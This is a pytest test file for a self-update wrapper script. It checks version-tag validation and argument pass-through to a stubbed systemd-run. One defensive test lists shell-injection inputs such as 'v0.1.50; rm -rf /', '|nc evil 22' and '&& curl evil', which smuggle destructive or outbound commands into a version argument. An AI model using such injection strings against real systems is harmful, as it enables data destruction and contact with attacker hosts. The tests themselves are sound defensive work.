"""Tests for the scripts/jarvis-self-update wrapper.

Exercises the version-shape guard and argv pass-through with a $PATH-shimmed
systemd-run so we don't actually launch the installer. The wrapper's job is
to (a) reject malformed version tags and (b) hand a valid tag through to
systemd-run with the right arguments — both are testable without root.
"""

import os
import subprocess
from pathlib import Path

import pytest


_REPO_ROOT = Path(__file__).resolve().parent.parent
WRAPPER = _REPO_ROOT / "scripts" / "jarvis-self-update"


@pytest.fixture
def systemd_run_stub(tmp_path):
    """(stub_dir, log_path) — $PATH dir with a systemd-run stub that logs argv."""
    log_path = tmp_path / "systemd_run.log"
    stub_dir = tmp_path / "bin"
    stub_dir.mkdir()
    sd = stub_dir / "systemd-run"
    sd.write_text(f'#!/bin/sh\necho "$@" >> {log_path}\nexit 0\n')
    sd.chmod(0o755)
    return stub_dir, log_path


def _run(args, stub, timeout=5):
    stub_dir, log_path = stub
    result = subprocess.run(
        [str(WRAPPER), *args],
        env={**os.environ, "PATH": f"{stub_dir}:{os.environ['PATH']}"},
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    logged = log_path.read_text().splitlines() if log_path.exists() else []
    return result, logged


class TestWrapperHappyPath:
    def test_valid_version_invokes_systemd_run(self, systemd_run_stub):
        result, logged = _run(["v0.1.50"], systemd_run_stub)
        assert result.returncode == 0, result.stderr
        assert len(logged) == 1
        argv = logged[0]
        # systemd-run gets the unit name + flags + bash -c '<cmd>'
        assert "--unit=jarvis-node-update" in argv
        assert "--collect" in argv
        assert "--no-block" in argv
        assert "bash -c" in argv
        # And the cmd refers to the exact version
        assert "v0.1.50" in argv

    def test_version_in_url_matches_arg(self, systemd_run_stub):
        result, logged = _run(["v1.2.3"], systemd_run_stub)
        assert result.returncode == 0
        # The version appears in both the curl URL and the --version flag
        argv = logged[0]
        assert "/v1.2.3/install.sh" in argv
        assert "--version v1.2.3" in argv


class TestWrapperEdgeCases:
    @pytest.mark.parametrize("version", [
        "0.1.50",          # missing leading v
        "v0.1",            # only two segments
        "v0.1.50.1",       # four segments
        "v0.1.50-rc1",     # pre-release
        "v0.1.50+meta",    # build metadata
        "vX.Y.Z",          # non-numeric
        "v0.1.50 extra",   # trailing junk
        "",                # empty
    ])
    def test_invalid_version_rejected(self, systemd_run_stub, version):
        result, logged = _run([version], systemd_run_stub)
        assert result.returncode != 0
        assert "invalid version" in result.stderr.lower()
        assert logged == []

    @pytest.mark.parametrize("version", [
        "v0.1.50; rm -rf /",
        "v0.1.50$(id)",
        "v0.1.50`whoami`",
        "v0.1.50|nc evil 22",
        "v0.1.50 && curl evil",
    ])
    def test_shell_injection_attempts_rejected(self, systemd_run_stub, version):
        """Defense in depth: malformed input that tries to break out of the
        bash -c string MUST be rejected by the regex before reaching systemd-run.
        """
        result, logged = _run([version], systemd_run_stub)
        assert result.returncode != 0
        assert logged == []

    def test_no_args_rejected(self, systemd_run_stub):
        result, logged = _run([], systemd_run_stub)
        assert result.returncode != 0
        assert "usage" in result.stderr.lower()
        assert logged == []

    def test_too_many_args_rejected(self, systemd_run_stub):
        result, logged = _run(["v0.1.50", "v0.1.51"], systemd_run_stub)
        assert result.returncode != 0
        assert logged == []
